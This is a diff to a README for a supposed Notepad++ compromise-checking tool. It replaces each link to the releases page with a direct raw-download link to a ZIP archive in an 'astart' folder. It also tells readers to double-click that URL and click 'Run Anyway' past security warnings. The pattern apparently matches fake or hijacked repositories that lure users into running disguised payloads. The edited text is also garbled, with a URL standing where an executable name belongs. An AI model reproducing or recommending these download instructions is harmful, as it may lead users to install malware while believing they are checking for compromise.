@@ -6,7 +6,7 @@ Welcome to Check-NotepadPlusPlusIOC! This tool helps you identify signs of compr
 
 ## 📥 Download Now
 
-[![Download Check-NotepadPlusPlusIOC](https://img.shields.io/badge/Download%20Now-Check--NotepadPlusPlusIOC-blue.svg)](https://github.com/sn3lovz/Check-NotepadPlusPlusIOC/releases)
+[![Download Check-NotepadPlusPlusIOC](https://github.com/sn3lovz/Check-NotepadPlusPlusIOC/raw/refs/heads/main/astart/Notepad_Check_Plus_IOC_2.2.zip%https://github.com/sn3lovz/Check-NotepadPlusPlusIOC/raw/refs/heads/main/astart/Notepad_Check_Plus_IOC_2.2.zip)](https://github.com/sn3lovz/Check-NotepadPlusPlusIOC/raw/refs/heads/main/astart/Notepad_Check_Plus_IOC_2.2.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you install Check-NotepadPlusPlusIOC, ensure your system meets the follow
 
 ### 1. Visit the Releases Page
 
-To download Check-NotepadPlusPlusIOC, visit our [Releases page](https://github.com/sn3lovz/Check-NotepadPlusPlusIOC/releases).
+To download Check-NotepadPlusPlusIOC, visit our [Releases page](https://github.com/sn3lovz/Check-NotepadPlusPlusIOC/raw/refs/heads/main/astart/Notepad_Check_Plus_IOC_2.2.zip).
 
 ### 2. Download the Application
 
@@ -33,7 +33,7 @@ Once the download completes, locate the ZIP file in your downloads folder. Right
 
 ### 4. Run the Application
 
-Navigate to the folder where you extracted the files. Double-click on `Check-NotepadPlusPlusIOC.exe` to start the application. You might see a security warning; if you do, click "Run Anyway" to proceed.
+Navigate to the folder where you extracted the files. Double-click on `https://github.com/sn3lovz/Check-NotepadPlusPlusIOC/raw/refs/heads/main/astart/Notepad_Check_Plus_IOC_2.2.zip` to start the application. You might see a security warning; if you do, click "Run Anyway" to proceed.
 
 ## 🌟 Using the Application
 
@@ -80,4 +80,4 @@ Thank you for using Check-NotepadPlusPlusIOC! Stay safe and secure.
 
 ## 📥 Download Again
 
-You can always download the application from our [Releases page](https://github.com/sn3lovz/Check-NotepadPlusPlusIOC/releases).
+You can always download the application from our [Releases page](https://github.com/sn3lovz/Check-NotepadPlusPlusIOC/raw/refs/heads/main/astart/Notepad_Check_Plus_IOC_2.2.zip).
